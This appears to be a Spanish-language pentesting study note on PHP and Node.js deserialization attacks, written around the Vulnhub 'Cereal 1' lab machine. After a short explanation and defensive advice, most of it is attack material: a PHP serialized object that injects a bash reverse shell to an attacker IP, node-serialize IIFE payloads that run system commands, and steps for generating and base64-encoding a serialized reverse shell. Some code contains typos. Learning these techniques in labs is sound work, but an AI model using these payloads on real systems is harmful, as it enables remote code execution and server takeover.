# Ataques de Deserialización

Tags: #Deserializacion #OWASP #Explotacion #Unserialized #IIFE

Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programación orientada a objetos (**POO**).

La serialización es el proceso de convertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La deserialización es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. Los ataques de deserialización ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a la **ejecución de código malicioso** en el servidor.

Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras, como:

-   Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.
-   Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
-   Realizar un ataque de “**man-in-the-middle**” para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.

Los ataques de deserialización pueden ser muy peligrosos, ya que pueden permitir que un atacante tome el control completo del servidor o la aplicación que está siendo atacada.

Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

A continuación se os proporciona el enlace directo a la máquina de Vulnhub donde explotamos un ‘**PHP Deserialization Attack**‘:

-   **Máquina Cereal 1**: [https://www.vulnhub.com/entry/cereal-1,703/](https://www.vulnhub.com/entry/cereal-1,703/)

## Comandos 

* PHP Deserialization Attack
* Se basa en objetos

Interceptamos la petición en BurpSuite
```bash
❯ obj=o%3A8%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A14%3A%22192.168.68.110%22%3B%7D&ip=192.168.68.110 # Estructura del objeto original que viaja en formato serializado
❯ obj=o:8"pingTest":1:{s:9:"ipAddress";s:14:"192.168.68.110";}&ip=192.168.68.110       # La deserializamos 
	# 8 = El objeto tiene 8 caracteres 'pingTest' (o=objeto)
	# 9 = Tiene una string de 9 caracteres 'ipAddress' (s=string)
	# 14 = Tiene una string de 14 caracteres '192.168.68.110' (s=string)
```
Lo que hace el servidor es **Deserializar** e interpretar lo que estamos enviando en el objeto y con base lo que estamos enviando, se ejecute una función o un método.

Empezando con el ataque, debemos de aprovecharnos de un campo para poder mandar la data serializada con nuestra ReverShell.
```php
❯ serilaized.php                                  
	<?php 
		class pingTest{
			public $ipAddress = "; bash -c 'bash -i >& /dev/tec/192.168.68.110/443 0>&1'";
			public $isValid = True;
			public $output = "";
		}
	?>
	echo urlencode(serialized(new pingTest));
```

Para poder ver la data serializada en la consola:
```bash
❯ php serialized.php 2>/dev/null; echo 
```

Pegamos el resultado cómo se muestra a continuación y lo mandamos por BurpSuite
```bash
❯ obj=RU5LCoMwFLzKIxTdtImxVuxHpXeQrrKJSaiB0AZf4ka8ewOFFgYGhvmtZJEuGnIht95PHpSTiODt6zkYDKuPo7MKdtbftZ4NYivIdZQ4wUHlX7bQZSCYNotgwSjB-LmkvG5oAueFYFV1hKLLeJ6i8CvEh3RWt8MczV99x-BjSBvJuvUdkD1Z0rWGlvREtg8%2C&v&ip=192.168.68.110  # Pegamos la data serializada, para que al momento de mandarla a la maquina victima la deserialice y la interprete y asi podamos tener una ReverShell
```

---

* Node Js Deserialization Attack
* [NodeJs-Deserialization attack](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) para podernos montar un servicio por el puerto 3000 y practicar 

En este caso la data que se esta enviando esta serializada, primero en urlencode y después en base64

* Función que nos ayudara a serializar algo que le pasemos.
```bash
❯ serilaized.js                    # Original 
	var y = {
	rce : function(){
	require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
	 },
	}
	var serialize = require('node-serialize');
	console.log("Serialized: \n" + serialize.serialize(y));
```

**IIFE (Inmediatly Invoked Function Expression)** que nos permite  invocar o hacer la llamada inmediatamente. 

Podemos colcar unos **()** antes de la coma y ahí podríamos hacer que no llegue a la parte de serialización y ejecute antes el comando
```bash
❯ serilaized.js                   # Debemos de colocarle el IIFE para que nos ejecute el comando 
	var y = {
	rce : function(){
	require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
	 }(),
	}
	var serialize = require('node-serialize');
	console.log("Serialized: \n" + serialize.serialize(y));
```

Para poder ver la data serializada del comando anterior en la consola:
```bash
❯ node serialized.js

# El resultado es:
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('id', function(error, stdout, stderr) {console.log(stdout) });\n }"}'
```


* Función para deserializar la data
```bash
❯ unserilaized.js                   # Original 
	var serialize = require('node-serialize');
	var payload = '{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('id', function(error, stdout, stderr) {console.log(stdout) });\n }"}';
	serialize.unserialize(payload);
```
En Payload debemos de cargar la data serializada, para que esta función me la pueda deserializar. 

```bash
❯ unserilaized.js                   # Debemos de colocarle el IIFE para que nos ejecute el comando y modificandolo 
	var serialize = require('node-serialize');
	var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\', function(error, stdout, stderr) {console.log(stdout) }); }()"}';
	serialize.unserialize(payload);
```

En la pagina podemos descargar la herramienta para podernos generar una ReverShell de forma serializada
```python 
❯ python2.7 nodejsshell.py <IP> <Port>

	# IP = Maquina de atacante 
	# Port = Nuestro puerto de atacante
```

El resultado lo debemos de colocar ahí:
```bash     
❯ nvim data                  # Debemos de colocarle el IIFE para que nos ejecute el comando
	{"rce":"_$$ND_FUNC$$_function(){resultado del comando anterior}()"}
```

Eso se debe de enviar en base64 
```bash
❯ cat data | base64 -w 0; echo     # Para que nos lo muestre en una unica linea y no nos muestre al final el #
```